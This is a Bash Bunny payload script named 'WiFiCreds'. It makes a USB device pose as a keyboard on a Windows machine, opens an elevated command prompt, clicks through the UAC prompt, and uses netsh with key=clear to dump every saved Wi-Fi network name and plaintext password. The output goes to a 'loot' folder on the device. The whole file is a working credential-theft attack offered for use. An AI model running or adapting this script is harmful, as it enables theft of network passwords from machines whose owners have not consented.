#!/bin/bash
#
# Title:         WiFiCreds
# Author:        illwill
# Version:       0.2
#
# Dumps the stored plaintext Wifi SSID & passwords from Windows boxes using Powershell
# then stashes them in /root/udisk/loot/WiFiCreds
#
# Blue...............Running Script
# Purple.............Getting WiFi Creds
# Green..............Got WiFi Creds :)
# Red................No WiFi Creds :(

LOOTDIR=/root/udisk/loot/WiFiCreds
mkdir -p $LOOTDIR

ATTACKMODE HID STORAGE
LED B 200
Q DELAY 1000
Q GUI
Q DELAY 200
Q STRING CMD
Q DELAY 400
Q CTRL-SHIFT ENTER
Q DELAY 2000
Q LEFTARROW
Q ENTER
Q DELAY 1000
Q STRING mode con:cols=18 lines=1
Q ENTER
Q DELAY 100
Q STRING for \/f "%D" in \(\'wmic LogicalDisk get Caption\^\, VolumeName \^\| find \"BashBunny\"\'\) do set BUNNY\=\%D
Q ENTER
Q DELAY 100
Q STRING echo. \& for \/f \"tokens\=4 delims\=: \" \%a in \(\'netsh wlan show profiles "^"\| find \"Profile \"\'\) d 
Q STRING o \@echo off \> nul \& \(netsh wlan show profiles name\=\%a key\=clear \| findstr \"SSID Content Authentication\" \| find \/v \"Number\" \& echo.\) \>\>\%BUNNY\%\\loot\\WifiCreds\\\%COMPUTERNAME%\.txt
Q ENTER
Q DELAY 100
Q STRING echo.\>\%BUNNY\%\\loot\\WifiCreds\\DONE
Q ENTER
Q DELAY 100
Q STRING EXIT
Q ENTER
Q DELAY 100
sync

while ! test -f "$LOOTDIR/DONE"; do
  sleep 1
  LED R B 200
done

#sleep for 10 seconds because they may have alot of stored connections to parse
sleep 10;

if [ -f "$LOOTDIR/DONE"  ]; then
   rm $LOOTDIR/DONE
   LED G 200
else
   LED R
fi
